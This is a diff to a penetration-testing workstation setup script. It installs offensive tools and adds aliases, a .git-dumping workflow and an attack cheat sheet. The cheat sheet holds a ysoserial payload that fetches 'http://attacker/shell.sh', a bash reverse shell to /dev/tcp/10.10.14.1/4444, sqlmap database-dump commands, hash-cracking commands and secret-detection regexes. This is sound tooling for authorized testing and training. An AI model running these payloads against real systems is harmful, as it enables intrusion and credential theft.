@@ -189,7 +189,71 @@ phase4_tools_setup() {
         penelope-shell \
         roadrecon \
         manspider \
-        mitmproxy || true
+        mitmproxy \
+        pwntools || true
+    
+    # High-priority gap tools
+    log_progress "Installing high-priority pentesting tools..."
+    
+    # SQL injection (if not pre-installed)
+    if ! command -v sqlmap &>/dev/null; then
+        log_progress "Installing sqlmap..."
+        DEBIAN_FRONTEND=noninteractive apt install -y sqlmap || true
+    fi
+    
+    # Password cracking (verify if pre-installed)
+    if ! command -v hashcat &>/dev/null; then
+        log_progress "Installing hashcat..."
+        DEBIAN_FRONTEND=noninteractive apt install -y hashcat || true
+    fi
+    
+    if ! command -v john &>/dev/null; then
+        log_progress "Installing john the ripper..."
+        DEBIAN_FRONTEND=noninteractive apt install -y john || true
+    fi
+    
+    # OSINT tools
+    log_progress "Installing OSINT tools..."
+    DEBIAN_FRONTEND=noninteractive apt install -y theharvester || true
+    
+    # Wordlist generation
+    log_progress "Installing CeWL (wordlist generator)..."
+    DEBIAN_FRONTEND=noninteractive apt install -y cewl || true
+    
+    # Java deserialization (ysoserial)
+    log_progress "Installing ysoserial (Java deserialization)..."
+    if [ ! -f "$USER_HOME/tools/ysoserial.jar" ]; then
+        DEBIAN_FRONTEND=noninteractive apt install -y default-jre || true
+        sudo -u jamie wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O $USER_HOME/tools/ysoserial.jar 2>/dev/null || log_warn "Failed to download ysoserial"
+        
+        # Create wrapper script
+        if [ -f "$USER_HOME/tools/ysoserial.jar" ]; then
+            cat > /usr/local/bin/ysoserial << 'YSOSERIAL_EOF'
+#!/bin/bash
+java -jar ~/tools/ysoserial.jar "$@"
+YSOSERIAL_EOF
+            chmod +x /usr/local/bin/ysoserial
+        fi
+    fi
+    
+    # Binary exploitation tools (optional but valuable for CTF)
+    log_progress "Installing binary exploitation tools..."
+    DEBIAN_FRONTEND=noninteractive apt install -y gdb || true
+    
+    # Install pwndbg (better GDB)
+    if [ ! -d "$USER_HOME/tools/repos/pwndbg" ]; then
+        log_progress "Installing pwndbg (enhanced GDB)..."
+        sudo -u jamie git clone https://github.com/pwndbg/pwndbg $USER_HOME/tools/repos/pwndbg || true
+        if [ -d "$USER_HOME/tools/repos/pwndbg" ]; then
+            cd $USER_HOME/tools/repos/pwndbg
+            sudo -u jamie ./setup.sh || log_warn "pwndbg setup failed (this is optional)"
+            cd - > /dev/null
+        fi
+    fi
+    
+    # ROPgadget for binary exploitation
+    log_progress "Installing ROPgadget..."
+    pip3 install --break-system-packages ROPgadget || true
     
     # Modern Go-based tools (ProjectDiscovery suite + essentials)
     log_progress "Installing modern Go-based tools (ProjectDiscovery suite)..."
@@ -243,6 +307,29 @@ phase4_tools_setup() {
     # Install proxychains-ng (modern proxychains alternative) - ADDED
     log_progress "Installing proxychains-ng..."
     DEBIAN_FRONTEND=noninteractive apt install -y proxychains4 || true
+    
+    # Git analysis and secret scanning tools
+    log_progress "Installing Git analysis and secret scanning tools..."
+    
+    # truffleHog - Find secrets in git repos
+    log_progress "Installing truffleHog (secret scanner)..."
+    pip3 install --break-system-packages truffleHog || true
+    
+    # gitleaks - SAST tool for detecting secrets
+    log_progress "Installing gitleaks (fast secret detector)..."
+    go install -v github.com/gitleaks/gitleaks/v8@latest || true
+    
+    # GitTools (Dumper, Extractor, Finder)
+    log_progress "Installing GitTools suite..."
+    if [ ! -d "$USER_HOME/tools/repos/GitTools" ]; then
+        sudo -u jamie git clone https://github.com/internetwache/GitTools.git $USER_HOME/tools/repos/GitTools
+    fi
+    
+    # git-dumper already installed via pip above
+    
+    # gitrob - Reconnaissance tool for GitHub organizations
+    log_progress "Installing gitrob (GitHub reconnaissance)..."
+    go install -v github.com/michenriksen/gitrob@latest || true
     
     # Clone essential repos
     log_progress "Cloning essential pentesting repositories..."
@@ -388,6 +475,9 @@ alias smb='netexec smb'
 alias winrm='netexec winrm'
 alias bloodhound='bloodhound-python'
 alias peas='linpeas.sh'
+alias secrets='gitleaks detect --source'  # Quick secret scan
+alias ysoserial='java -jar ~/tools/ysoserial.jar'  # Java deserialization
+alias pwn='gdb -q'  # Quick GDB with pwndbg
 
 # Aliases - Navigation
 alias tools='cd ~/tools'
@@ -447,6 +537,54 @@ reconchain() {
     echo "[+] Starting reconnaissance chain for: $1"
     echo "[*] Subfinder → DNSx → HTTPx → Nuclei"
     subfinder -d $1 -silent | dnsx -a -silent | httpx -tech-detect -silent | nuclei -severity critical,high
+}
+
+# gitanalyze: Complete Git repository disclosure workflow
+gitanalyze() {
+    if [ -z "$1" ]; then
+        echo "Usage: gitanalyze <git-url>"
+        echo "Example: gitanalyze http://target.com/.git/"
+        return 1
+    fi
+    
+    local url="$1"
+    local output_dir="git-dump-$(date +%Y%m%d_%H%M%S)"
+    
+    echo "[+] Git Repository Analysis Workflow"
+    echo "[*] Target: $url"
+    echo ""
+    
+    # Step 1: Dump the repository
+    echo "[1/4] Dumping .git repository..."
+    git-dumper "$url" "$output_dir" || {
+        echo "[-] git-dumper failed, trying GitTools..."
+        bash ~/tools/repos/GitTools/Dumper/gitdumper.sh "$url" "$output_dir"
+    }
+    
+    # Step 2: Extract all commits
+    echo "[2/4] Extracting commits..."
+    bash ~/tools/repos/GitTools/Extractor/extractor.sh "$output_dir" "${output_dir}-extracted"
+    
+    # Step 3: Scan for secrets with gitleaks
+    echo "[3/4] Scanning for secrets with gitleaks..."
+    gitleaks detect --source "$output_dir" --report-path "${output_dir}-gitleaks.json" --report-format json || true
+    
+    # Step 4: Scan with truffleHog
+    echo "[4/4] Scanning with truffleHog..."
+    trufflehog filesystem "$output_dir" --json > "${output_dir}-trufflehog.json" || true
+    
+    echo ""
+    echo "[+] Analysis complete!"
+    echo "    Repository: $output_dir"
+    echo "    Extracted commits: ${output_dir}-extracted"
+    echo "    Gitleaks report: ${output_dir}-gitleaks.json"
+    echo "    TruffleHog report: ${output_dir}-trufflehog.json"
+    echo ""
+    echo "[!] Don't forget to check:"
+    echo "    - docker-compose.yml"
+    echo "    - .env files"
+    echo "    - config/ directories"
+    echo "    - Database connection strings"
 }
 ZSH_EOF
 
@@ -724,16 +862,132 @@ git-dumper
   Dump exposed .git repositories
   Usage: git-dumper http://target/.git/ output_dir/
 
+GIT REPOSITORY ANALYSIS
+
+GitTools
+  Suite for finding and exploiting exposed .git directories
+  Location: ~/tools/repos/GitTools/
+  
+  Finder: Find websites with exposed .git
+    python3 GitTools/Finder/gitfinder.py -i targets.txt
+  
+  Dumper: Download exposed .git repository
+    bash GitTools/Dumper/gitdumper.sh http://target/.git/ output_dir/
+  
+  Extractor: Extract commits from downloaded .git
+    bash GitTools/Extractor/extractor.sh output_dir/ extracted/
+
+truffleHog
+  Find secrets and credentials in git history
+  Usage: trufflehog git file:///path/to/repo
+  Remote: trufflehog git https://github.com/user/repo
+  Docker: trufflehog docker --image repo:tag
+
+gitleaks
+  Fast secret detector for git repositories
+  Usage: gitleaks detect --source /path/to/repo
+  Scan file: gitleaks detect -f config.yaml
+  Protect: gitleaks protect (pre-commit hook)
+
+gitrob
+  GitHub organization reconnaissance
+  Usage: gitrob <github-org>
+  Note: Requires GitHub API token
+
+COMMON GIT SECRET PATTERNS
+  - AWS Keys: AKIA[0-9A-Z]{16}
+  - Private Keys: -----BEGIN.*PRIVATE KEY-----
+  - Database URLs: mysql://.*:.*@.*
+  - API Keys: api[_-]?key.*['\"][0-9a-zA-Z]{32,}['\"]
+
+═══════════════════════════════════════════════════════════════════════════
+WEB APPLICATION TESTING
+═══════════════════════════════════════════════════════════════════════════
+
 SQL INJECTION
 sqlmap
   Automated SQL injection exploitation
   Usage: sqlmap -u <url> --batch --dump
+  POST data: sqlmap -u <url> --data="param=value" --batch
+  Tamper scripts: sqlmap -u <url> --tamper=space2comment
+  Database dump: sqlmap -u <url> -D <db> -T <table> --dump
+
+DESERIALIZATION ATTACKS
+ysoserial
+  Java deserialization payload generator
+  Location: ~/tools/ysoserial.jar
+  Usage: ysoserial <payload> <command>
+  Example: ysoserial CommonsCollections6 "wget http://attacker/shell.sh"
+  List payloads: ysoserial --help
+  Common payloads: CommonsCollections1-7, Spring1-2, URLDNS
 
 REVERSE SHELLS
 penelope
   Feature-rich reverse shell handler
   Usage: penelope 4444
   Note: Auto-upgrades shells, handles PTY, session management
+
+═══════════════════════════════════════════════════════════════════════════
+PASSWORD CRACKING
+═══════════════════════════════════════════════════════════════════════════
+
+hashcat
+  GPU-accelerated password cracking
+  NTLM: hashcat -m 1000 hashes.txt rockyou.txt
+  NTLMv2: hashcat -m 5600 hashes.txt rockyou.txt
+  bcrypt: hashcat -m 3200 hashes.txt rockyou.txt
+  SHA256: hashcat -m 1400 hashes.txt rockyou.txt
+  Modes: hashcat --help | grep -i <hash-type>
+  Show cracked: hashcat -m <mode> hashes.txt --show
+
+john
+  CPU password cracking (John the Ripper)
+  Basic: john --wordlist=rockyou.txt hashes.txt
+  Format: john --format=NT hashes.txt --wordlist=rockyou.txt
+  Show: john --show hashes.txt
+  Incremental: john --incremental hashes.txt
+
+CeWL
+  Generate custom wordlists from websites
+  Usage: cewl -d 2 -m 5 -w wordlist.txt <url>
+  With emails: cewl -d 2 -m 5 -e -w wordlist.txt <url>
+  Authentication: cewl -d 2 -m 5 -w wordlist.txt <url> -a
+
+═══════════════════════════════════════════════════════════════════════════
+BINARY EXPLOITATION
+═══════════════════════════════════════════════════════════════════════════
+
+pwntools
+  Python exploit development library
+  Usage: from pwn import *
+  Example: r = remote('target', 1337)
+  Common: p64(), p32(), cyclic(), asm(), shellcraft
+
+pwndbg
+  Enhanced GDB with pwntools integration
+  Usage: gdb ./binary (pwndbg loads automatically)
+  Commands: checksec, cyclic, vmmap, telescope, heap
+  Breakpoints: break main, run, continue, step
+
+ROPgadget
+  ROP chain builder
+  Usage: ROPgadget --binary ./binary
+  Find gadgets: ROPgadget --binary ./binary --only "pop|ret"
+  ROP chain: ROPgadget --binary ./binary --ropchain
+
+═══════════════════════════════════════════════════════════════════════════
+OSINT & INFORMATION GATHERING
+═══════════════════════════════════════════════════════════════════════════
+
+theHarvester
+  OSINT email and subdomain gathering
+  Usage: theHarvester -d <domain> -b all
+  Specific source: theHarvester -d <domain> -b google,linkedin,dnsdumpster
+  Save results: theHarvester -d <domain> -b all -f output.html
+
+subfinder
+  Fast passive subdomain discovery (covered in RECONNAISSANCE above)
+  Usage: subfinder -d <domain> -silent | tee subdomains.txt
 
 ═══════════════════════════════════════════════════════════════════════════
 PRIVILEGE ESCALATION
@@ -834,6 +1088,24 @@ Pivoting Preference:
 
 Password Attacks:
   netexec for spraying, then dump with secretsdump/lsassy
+  Crack hashes: hashcat -m <mode> hashes.txt rockyou.txt
+
+SQL Injection:
+  1. Detect: sqlmap -u <url> --batch
+  2. Enumerate: sqlmap -u <url> --dbs
+  3. Dump: sqlmap -u <url> -D <db> -T <table> --dump
+
+Java Deserialization:
+  1. Identify: Look for serialized objects (rO0AB, aced0005)
+  2. Payload: ysoserial CommonsCollections6 "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"
+  3. Deliver: Replace serialized object with malicious payload
+
+Git Repository Disclosure:
+  1. Find: GitTools/Finder or manual discovery
+  2. Dump: git-dumper or GitTools/Dumper
+  3. Extract: GitTools/Extractor (recovers all commits)
+  4. Scan secrets: trufflehog + gitleaks on extracted repo
+  5. Review: Check docker-compose.yml, .env files, config files
 
 ═══════════════════════════════════════════════════════════════════════════
 TIPS & TRICKS
@@ -899,7 +1171,11 @@ echo "[+] Updating system packages..."
 sudo apt update && sudo apt upgrade -y
 
 echo "[+] Updating Python tools..."
-pip3 install --upgrade --break-system-packages impacket bloodhound bloodyAD mitm6 certipy-ad
+pip3 install --upgrade --break-system-packages impacket bloodhound bloodyAD mitm6 certipy-ad truffleHog pwntools ROPgadget
+
+echo "[+] Updating system packages (sqlmap, hashcat, john, etc.)..."
+sudo apt update
+sudo apt upgrade -y sqlmap hashcat john theharvester cewl gdb
 
 echo "[+] Updating Go tools..."
 go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
@@ -911,9 +1187,14 @@ go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
 go install -v github.com/ffuf/ffuf@latest
 go install -v github.com/OJ/gobuster/v3@latest
 go install -v github.com/jpillora/chisel@latest
+go install -v github.com/gitleaks/gitleaks/v8@latest
+go install -v github.com/michenriksen/gitrob@latest
 
 echo "[+] Updating Nuclei templates..."
 nuclei -update-templates
+
+echo "[+] Updating ysoserial..."
+wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ~/tools/ysoserial.jar 2>/dev/null || echo "[-] Failed to update ysoserial"
 
 echo "[+] Updating repositories..."
 cd ~/tools/repos
@@ -927,6 +1208,13 @@ done
 echo "[+] Updating SecLists..."
 cd ~/tools/wordlists/SecLists
 git pull
+
+echo "[+] Updating pwndbg..."
+if [ -d ~/tools/repos/pwndbg ]; then
+    cd ~/tools/repos/pwndbg
+    git pull
+    cd -
+fi
 
 echo "[+] All tools updated!"
 EOF
